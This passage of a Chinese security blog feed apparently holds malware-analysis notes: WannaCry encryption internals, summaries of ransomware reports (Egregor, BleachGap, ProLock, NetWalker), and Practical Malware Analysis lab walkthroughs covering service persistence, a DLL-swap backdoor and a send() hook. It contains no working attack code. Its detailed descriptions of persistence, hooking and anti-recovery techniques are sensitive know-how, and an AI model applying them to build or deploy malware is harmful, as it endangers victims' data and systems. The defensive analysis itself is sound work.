src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405105224751.png" alt="image-20210405105224751" style="zoom:67%;"><ul><li>经过一系列操作正确打开文件后，获取文件的大小和时间</li><li>读取文件开始8个字节，与’WANACRY!’比较，这一判断是为验证文件是否已经被加密了</li></ul><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405105606047.png" alt="image-20210405105606047" style="zoom:67%;"><ul><li>在文件名背后加‘T’，创建该文件，该文件此时后缀应为.WNCRYT</li></ul><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405110708477.png" alt="image-20210405110708477" style="zoom:67%;"><ul><li>写入加密文件头，分别为<ul><li>写入8字节“WANACRY!”</li><li>写入4字节</li><li>写入0x100字节的加密数据，v17在之前获得</li><li>写入自定义的文件类型值</li><li>写入原文件大小</li></ul></li></ul><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405111147513.png" alt="image-20210405111147513" style="zoom:67%;"><ul><li>循环读取原文件内容，每次读取0x100000个字节</li><li>调用函数<code>sub_10006940</code>对读取的内容进行加密，注意到参数v12一般对应值为0x10，这意味着在该函数中是以每0x10个字节为单位加密文件的</li><li>将加密的内容写入之前创建的加密文件内</li></ul><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405112241501.png" alt="image-20210405112241501" style="zoom:67%;"><ul><li>设置文件时间、文件属性，将原文件加入删除列表</li></ul><h4 id="加密过程总结"><a href="#加密过程总结" class="headerlink" title="加密过程总结"></a>加密过程总结</h4><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210405135139721.png" alt="image-20210405135139721"></p><p>部分可能的恢复方案</p><ul><li>由于勒索软件采用Windows的csp的API，产生密钥所用的素数可能遗留在内存中，如果未被覆盖，则存在截取并产生相同密钥的可能</li><li>只读文件由于不会被修改重命名，实际上不会被删除，只会调整属性为隐藏</li><li>部分系统盘符下特定目录下的的文件存在覆写操作，可能无法恢复</li><li>对于加密的文件，实际上原文件并未被立刻删除，而是被重命名后移动到对应盘符下创建的临时目录下，调用删除线程删除。</li></ul><h3 id="taskdl-exe分析"><a href="#taskdl-exe分析" class="headerlink" title="taskdl.exe分析"></a>taskdl.exe分析</h3><p>该程序会在之前TaskStart函数创建的第四个线程中被启动，其主函数结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329125117408.png" alt="image-20210329125117408" style="zoom:67%;"><ul><li>获取当前可用磁盘</li><li>获得当前磁盘类型，不可是远程磁盘（对应4）</li><li>调用函数<code>sub_401080</code>，该函数结构如下所示</li></ul><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329125715150.png" alt="image-20210329125715150" style="zoom:67%;"><ul><li>调用函数<code>sub_401000</code>，保存回收站和C盘下临时文件路径</li><li>拼接字符串，在前一路径后拼接上<code>*.WNCRYT</code>，保存到Buffer</li><li>遍历Buffer形式的文件，即后缀为WNCRYT的文件，获取其全路径保存到</li></ul><h3 id="WanaDecryptor-exe分析"><a href="#WanaDecryptor-exe分析" class="headerlink" title="@WanaDecryptor@.exe分析"></a>@WanaDecryptor@.exe分析</h3><p>尚未详细分析，单独运行结果是会生成壁纸，并且每几秒弹出勒索窗口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>勒索软件分析报告阅读记录</title>
      <link href="2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/"/>
      <url>2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><strong>看的一些勒索软件报告</strong></p><a id="more"></a><h2 id="WannaRen"><a href="#WannaRen" class="headerlink" title="WannaRen"></a>WannaRen</h2><p>2020.04</p><h2 id="Egregor"><a href="#Egregor" class="headerlink" title="Egregor"></a>Egregor</h2><p>2020.09</p><h3 id="分发方法"><a href="#分发方法" class="headerlink" title="分发方法"></a>分发方法</h3><p>主要是<strong>Cobalt Strike</strong>，通过诸如RDP攻击、网络钓鱼等方式破坏目标环境，一旦Cobalt Strike信标有效负载建立并持续存在，就可以交付和启动有效负载。</p><p>因为Egregor是一个拥有多个分支机构的RaaS（勒索软件即服务），不同攻击者采用的攻击方式和武器化策略会有不同。</p><h3 id="有效负载"><a href="#有效负载" class="headerlink" title="有效负载"></a>有效负载</h3><p>Egregor有效负载（DLL）是高度模糊的，包括Salsa20加密配置数据。</p><p>文件加密通过ChaCha流密码和RSA的组合实现。</p><p>每个有效负载包含一个RSA-2048公钥。基于DLL的有效负载在启动时需要一个密钥/密码，该密钥特定于每个样本。</p><p>数据溢出的主要方法似乎是<code>Rclone</code></p><h3 id="Post-Compromise行为"><a href="#Post-Compromise行为" class="headerlink" title="Post-Compromise行为"></a>Post-Compromise行为</h3><p>Egregor会在受害者不遵守赎金要求的情况下将泄露的数据发布到自己的博客上</p><p>其赎金记录遵循一个模板，指示受害者访问其基于TOR的支付门户以获取进一步的指示</p><p>每个赎金票据的底部还有一个加密的blob，其中包含受害者特定的系统数据以及已编码的RSA公钥。</p><p><a href="https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone/">Egregor勒索软件简要分析报告</a></p><h2 id="BleachGap"><a href="#BleachGap" class="headerlink" title="BleachGap"></a>BleachGap</h2><p>2021.02</p><p>具备添加自启动、添加计划任务、改写MBR、使键盘按键失效、通过可移动介质传播等多项功能</p><p>采用AES-256对称加密算法加密文件</p><p>攻击流程如下所示</p><img src="/2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20210321171900462.png" alt="image-20210321171900462" style="zoom:67%;"><p>bat行为</p><ul><li>删除系统卷影，防止恢复加密文件</li><li>修改注册表，绕过UAC机制，关闭安全警告</li><li>互换鼠标左右键，键盘按键失效</li><li>结束浏览器进程，结束任务管理器，创建计划任务，实现登陆时运行</li><li>调用aescrypt.exe，加密部分文件</li><li>生成勒索信</li><li>调用DiscordSendWebhook.exe，将用户名、加密密钥、个人ID等信息发送到攻击者创建的Discord频道</li><li>下载恶意代码，创建计划任务，每五天运行一次，会改写MBR，在开机时锁定计算机</li><li>在每个磁盘根目录下创建autorun.inf文件，而且可以感染U盘，即使重装系统后，再打开其他硬盘又会激活病毒</li></ul><p><a href="https://mp.weixin.qq.com/s/P-mDJtc8rhveY9yMQyloHA"><strong>安天智甲有效防护 BleachGap 勒索软件</strong></a></p><h2 id="ProLock"><a href="#ProLock" class="headerlink" title="ProLock"></a>ProLock</h2><p>2020.04</p><p>将恶意shellcode嵌入到名为“WinMgr.bmp”的BMP图像文件中，通过混淆的PowerShell代码将图像中的代码注入到内存中运行。勒索软件执行后，加密计算机上的文件。</p><p>推测为PwndLocker勒索软件变种</p><img src="/2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20210321171836749.png" alt="image-20210321171836749" style="zoom:67%;"><p>共包含4个文件</p><ul><li>run.bat</li><li>clean.bat</li><li>WinMgr.xml</li><li>WinMgr.bmp</li></ul><p>行为</p><ul><li>从run.bat脚本文件启动，创建Windows任务并用WinMgr.xml进行配置</li><li>执行clean.bat脚本，然后执行Base64编码的Powshell脚本，从WinMgr.bmp中提取出可执行文件并加载到内存中</li><li>为了顺利加密文件，调用cmd执行命令停止大量服务</li><li>使用“AES+RSA”加密算法加密文件，删除卷影副本防止恢复加密文件</li><li>加密计算机文件后会在原文件名后追加“.proLock”后缀</li><li>生成勒索信</li></ul><p><a href="https://news.sophos.com/en-us/2020/07/27/prolock-ransomware-gives-you-the-first-8-kilobytes-of-decryption-for-free/">ProLock ransomware gives you the first 8 kilobytes of decryption for free</a></p><h2 id="NetWalker"><a href="#NetWalker" class="headerlink" title="NetWalker"></a>NetWalker</h2><p>2019</p><p>攻击者不断研究复杂的方式逃避检测，其中一种攻击方式是利用了反射动态链接库（DLL）注入的技术，也称reflective DLL加载</p><p>脚本行为分析</p><ul><li>脚本进行了多层加密、混淆、编码<ul><li>最顶层为base64编码</li><li>下一层是十六进制编码XOR加密</li><li>解密后仍有一定程度混淆</li></ul></li><li>勒索软件以十六进制嵌入脚本，脚本会将其解码产生两个DLL，根据环境判断使用的DLL脚本</li><li>将恶意DLL以反射方式注入到进程explorer.exe中</li></ul><p>软件分析</p><ul><li>使用6个随机字符作为扩展名重命名加密文件</li><li>添加注册表项</li><li>终止某些进程与服务（比如数据备份、安全等相关的进程）</li></ul><p><a href="https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html">Reflective Loading Runs Netwalker Fileless Ransomware</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战lab记录</title>
      <link href="2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/"/>
      <url>2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><strong>《恶意代码分析实战》里做的一些实验的记录</strong></p><a id="more"></a><h2 id="ch7"><a href="#ch7" class="headerlink" title="ch7"></a>ch7</h2><h3 id="7-1"><a href="#7-1" class="headerlink" title="7-1"></a>7-1</h3><p>自启动服务</p><p>使用IDA查看main函数</p><ul><li>将<code>ServiceStartTable.lpServiceName</code>赋值为“MalService”</li><li>将<code>ServiceStartTable.lpServiceProc</code>赋值为sub_401040</li><li>调用<code>StartServiceCtrlDispatcherA</code></li></ul><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314130502920.png" alt="image-20210314130502920" style="zoom:67%;"><p>查询SERVICE_TABLE_ENTRYA结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">The SERVICE_TABLE_ENTRY structure is used by the StartServiceCtrlDispatcher function to specify the ServiceMain function for a service that can run in the calling process.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">lpServiceName:Pointer to a null-terminated string that specifies the name of a service to be run in this service process. </span></span><br><span class="line"><span class="comment">lpServiceProc:Pointer to a ServiceMain function. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SERVICE_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">  LPTSTR lpServiceName;</span><br><span class="line">  LPSERVICE_MAIN_FUNCTION lpServiceProc;</span><br><span class="line">&#125; SERVICE_TABLE_ENTRY, *LPSERVICE_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>综上，可以知道主函数会将从地址sub_401040开始运行名为MalService的服务，进一步分析sub_401040</p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314131829082.png" alt="image-20210314131829082" style="zoom:67%;"><ul><li><p>检测互斥量HGL345(变量Name的值)是否存在，如果不存在则创建该互斥量，如果存在则结束程序，因为这说明已经存在一个恶意程序了</p></li><li><p>调用<code>OpenSCManagerA</code>函数，打开一个服务控制管理器的句柄，以便这个程序可以添加或者修改服务</p></li><li><p>调用<code>GetCurrentProcess</code>函数，获取当前进程句柄</p></li><li><p>调用<code>GetModuleFileNameA</code>函数，获取当前进程的完整路径名到变量Filename</p></li><li><p>调用<code>CreateServiceA</code>函数，定义如下，对照调用的参数可知作用是创建了名为“Malware”的服务，对应的可执行文件位置为Filename，dwServiceType为0x10表示在自己的进程中运行的服务，dwStartType为0x2表示该程序会自启动，说明这一服务会在系统开机时运行</p><p>可参考<a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea">CreateServiceA function</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SC_HANDLE <span class="title">CreateServiceA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hSCManager,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDisplayName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwServiceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwStartType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwErrorControl,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpBinaryPathName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpLoadOrderGroup,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD   lpdwTagId,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDependencies,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceStartName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpPassword</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>设定时间变量SystemTime，具体为2100年1月1日0时0分</p></li><li><p>调用<code>systemtimetofiletime</code>将设定的时间转换为文件格式时间变量FileTime</p></li><li><p>调用<code>CreateWaitableTimer</code>函数创建无界面定时器，句柄为v1，调用<code>SetWaitableTimer</code>设置该定时器时间为到FileTime为止</p></li><li><p>调用<code>waitforsingleobject</code>等待定时器到时或超出时间间隔，如果没到时则Sleep后退出</p></li><li><p>到时后，调用20次<code>CreateThread</code>函数创建多个起始地址为StartAddress的线程</p></li></ul><p>进一步分析StartAddress</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314140317244.png" alt="image-20210314140317244"></p><ul><li>无出口循环结构，最初会调用<code>InternetOpen</code>函数设置用户代理为“Internet Explorer 8.0”</li><li>反复调用<code>InternetOpenUrl</code>函数，功能是反复打开url为<code>http://www.malwareanalysisbook.com</code>的网址</li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul><li><p>当计算机重启之后，这个程序如何保证它继续运行（达到持久化驻留）？</p><p>该程序在通过创建服务时设置参数将该服务设置为自启动，保证其开机时自动运行</p></li><li><p>为什么这个程序会使用一个互斥量？</p><p>保证系统中同时只有一个实例运行</p></li><li><p>可以用来检测这个程序的基于主机特征是什么？</p><p>互斥量HGL345，服务MalService</p></li><li><p>检测这个恶意代码的基于网络特征是什么？</p><p>使用“Internet Explorer 8.0”用户代理访问<code>http://www.malwareanalysisbook.com</code></p></li><li><p>这个程序的目的是什么？</p><p>潜伏到2100年1月1日对<code>http://www.malwareanalysisbook.com</code>发起DDOS攻击</p></li><li><p>这个程序什么时候完成执行？</p><p>不会停止执行</p></li></ul><h3 id="7-2"><a href="#7-2" class="headerlink" title="7-2"></a>7-2</h3><p>组件对象模型COM库</p><p>使用IDA查看主函数</p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314200525735.png" alt="image-20210314200525735" style="zoom:67%;"><ul><li><p>调用<code>OleInitialize</code>函数初始化COM（组件对象模型）库</p></li><li><p>调用<code>CoCreateInstance</code>来获取对COM功能的访问，将该COM对象标记为ppv</p><p>可参考 <a href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance">CoCreateInstance</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">CoCreateInstance</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  REFCLSID  rclsid,              <span class="comment">//待创建组件的CLSID</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPUNKNOWN pUnkOuter,           <span class="comment">//指向聚合组件，为空表示非聚合</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwClsContext,        <span class="comment">//管理创建对象的代码将在其中运行的上下文，表示类别</span></span></span></span><br><span class="line"><span class="function"><span class="params">  REFIID    riid,                <span class="comment">//创建的COM对象的接口标识符，用于通信</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID    *ppv                 <span class="comment">//用来接收指向Com对象接口地址的指针变量 </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数中rclsid为<code>0002DF01-0000-0000-C000-000000000046</code>，保存在<code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code></p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314202358889.png" alt="image-20210314202358889"></p><p>riid为<code>D30C1661-CDAF-11D0-8A3E-00C</code></p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314202434329.png" alt="image-20210314202434329"></p><p>打开注册表编辑器查询（实际上这两个是书上的例子）</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314203631781.png" alt="image-20210314203631781"></p><p>可知其为IWebBrowser2接口</p><p>在结构视图添加对应标准结构</p></li></ul><h4 id="7-3"><a href="#7-3" class="headerlink" title="7-3"></a>7-3</h4><p>DLL替换    </p><p>用IDA打开exe文件，查看字符串，发现一些可疑的字符串</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315185807410.png" alt="image-20210315185807410"></p><p>用IDA打开dll文件，查看字符串，发现一个IP</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315212711194.png" alt="image-20210315212711194"></p><p>对dll文件主函数DLLMain进行分析</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315221404174.png" alt="image-20210315221404174"></p><ul><li>首先创建或打开互斥量，名为“SADFHUHF”</li><li>调用WSAStartup进行库函数绑定。调用函数socket，参数（2,1,6）表示使用IPv4，TCP流。</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315231751759.png" alt="image-20210315231751759"></p><ul><li>设置保留地址为127.26.152.13，调用<code>connect</code>函数进行连接</li><li>send操作，发送“hello”到接收方</li><li>recv操作，接收字节到buf字段，与“sleep”比较，如果是sleep，则休眠一段时间</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316094513218.png" alt="image-20210316094513218"></p><ul><li>将buf字段前4个字节与“exec”比较，如果是则调用<code>CreateProcess</code>创建进程，创建的命令语句为&amp;v11[4]，参考栈对应的结构，这里是指buf字段的第五个字节起的字符串。即执行接受到的命令，执行结束后会回到hello处</li><li>总结：实现与远程端交互功能的后门</li></ul><p>对exe文件主函数main进行分析</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316100032936.png" alt="image-20210316100032936"></p><ul><li>比较参数数量是否为2，以及第二个参数是否为一个警告字符串</li><li>调用<code>CreateFileA/CreateFileMappingA/MapViewOfFile</code>等将<code>C:\Windows\System32\Kernel32.dll</code>映射到内存</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316100406267.png" alt="image-20210316100406267"></p><ul><li><p>使用类似的操作将<code>Lab07-03.dll</code>映射到内存，推测该为后门dll</p></li><li><p>接下来是一段比较复杂的操作，其中有使用了了字符串”kerne132.dll”，推测是进行内存操作，创建用于混淆视听的内存映射<code>kerne132.dll</code></p></li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316101332111.png" alt="image-20210316101332111"></p><ul><li>在最后处，关闭了两个文件映射的句柄，将<code>C:\Windows\System32\Kernel32.dll</code>文件内容复制到<code>C:\windows\system32\kerne132.dll</code>中</li><li>调用<code>sub_4011E0</code>函数，注意传入的参数lpFileName的值是C的盘符，进一步查看该函数内部</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316101846395.png" alt="image-20210316101846395"></p><ul><li><p>使用的<code>FindFirstFile/FindNextFile</code>等函数和循环结构会循环搜索C盘下的所有文件</p></li><li><p>在循环结构内部，对于找到的文件判断是否可进一步递归查找，如果可以则递归调用<code>sub_4011E0</code>函数，已达到搜索C盘下所有文件的目的</p></li><li><p>如果为文件，判断其是否是exe文件，如果是，调用函数<code>sub_4010A0</code>，该函数会打开这一文件进行文件操作，简单来说会找到该文件内<code>kernel32.dll</code>字符串所在的位置，并用<code>kerne132.dll</code>进行替换</p></li><li><p>总结：该exe文件将Lab07-03.dll文件复制为<code>C:\\windows\\system32\\kerne132.dll</code>，并会遍历C盘下所有加载了<code>kernel32.dll</code>的exe文件，将动态链接库修改为<code>kerne132.dll</code></p></li></ul><h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><ul><li><p>当计算机重启之后，这个程序如何保证它继续运行（达到持久化驻留）？</p><p>该程序将后门植入到恶意dll文件中，并修改了C盘下所有可执行文件的动态链接</p></li><li><p>可以用来检测这个程序的基于主机特征是什么？</p><p>互斥量<code>SADFHUHF</code>，dll文件<code>kerne132.dll</code></p></li><li><p>这个程序的目的是什么？</p><p>植入极难移除的后门程序，可由远程主机进行执行命令</p></li><li><p>安装后如何移除</p><p>可以以类似于该程序的方式修改盘符下所有可执行文件的动态链接库为<code>kernel32.dll</code>，再删除<code>kerne132.dll</code>即可</p></li></ul><h2 id="ch11"><a href="#ch11" class="headerlink" title="ch11"></a>ch11</h2><h3 id="11-1"><a href="#11-1" class="headerlink" title="11-1"></a>11-1</h3><h3 id="11-2"><a href="#11-2" class="headerlink" title="11-2"></a>11-2</h3><p>检查dll文件，发现一个导出函数installer</p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316132518610.png" alt="image-20210316132518610"></p><p>查看dll文件导出函数<code>installer</code></p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316152737926.png" alt="image-20210316152737926"></p><ul><li>调用<code>RegOpenKeyEx</code>打开注册表<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code>，句柄保存到phkResult</li><li>调用<code>RegSetValueEx</code>，设置<code>AppInit_DLLs</code>表项值为<code>spoolvxx32.dll</code></li><li>调用<code>CopyFile</code>将自身dll复制到<code>system32\spoolvxx32.dll</code></li></ul><p>查看dll文件主函数<code>DllMain</code></p><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316132617243.png" alt="image-20210316132617243"></p><ul><li>保存当前完整路径到hinstDLL</li><li>打开文件<code>system32\Lab11-02.ini</code></li><li>读取文件到<code>byte_100034A0</code>，调用<code>sub_100010B3</code>函数进行处理，推测该函数为一个解密函数</li><li>调用<code>sub_100014B6</code>函数，进入查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316164014996.png" alt="image-20210316164014996"></p><ul><li>调用<code>sub_10001075</code>函数，将当前模块完整路径保存到Buf1</li><li>调用<code>sub_10001104</code>函数，返回最后一个<code>\</code>之后的字符串，即模块名，保存到Buf1</li><li>调用<code>sub_1000102D</code>函数，将Buf1所有小写字母变为大写</li><li>比较Buf1和“THEBAT.EXE”、“OUTLOOK.EXE”、“MSIMN.EXE”，有任一相同则判断成功</li><li>调用<code>sub_100013BD</code>函数，挂起除当前进程外所有线程</li><li>调用<code>sub_10001499</code>函数，恢复线程</li><li>调用<code>sub_100012A3</code>函数，四个参数分别是’wsock32.dll’、’send’、<code>sub_1000113D</code>、dword_10003484数据空间，进入详细查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321115649645.png" alt="image-20210321115649645"></p><ul><li>经过一系列操作获取<code>wsock32.dll</code>的句柄和其中<code>send</code>函数的地址，保存到result</li><li>调用<code>sub_10001203</code>函数函数，三个参数分别为<code>send</code>函数的地址，<code>sub_1000113D</code>、dword_10003484数据空间，进入详细查看</li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321131033605.png" alt="image-20210321131033605"></p><ul><li>调用<code>VirtualProtect</code>函数改变send函数的保护方式，并保存旧的保护方式到<code>flOldProtect</code>，之后会再次调用<code>VirtualProtect</code>函数恢复保护方式</li><li>经过一系列内存操作，修改send函数内容，会在开头跳转到<code>sub_1000113D</code>，注意前5个字节被保留，因为需要正常的函数开头方便执行</li><li>最后会在dword_10003484</li><li>进入hook函数<code>sub_1000113D</code></li></ul><p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321132039444.png" alt="image-20210321132039444"></p><ul><li>查找字符串中是否有’RCPT TO:’，如果存在，则创建一个’RCPT TO:’开头的字符串，后跟byte_100034A0，此时应该表示解密获得的邮箱地址，最后以‘&gt;\r\n’结束</li></ul><h4 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h4><ul><li> 这个恶意DLL导出了什么？</li></ul><p>  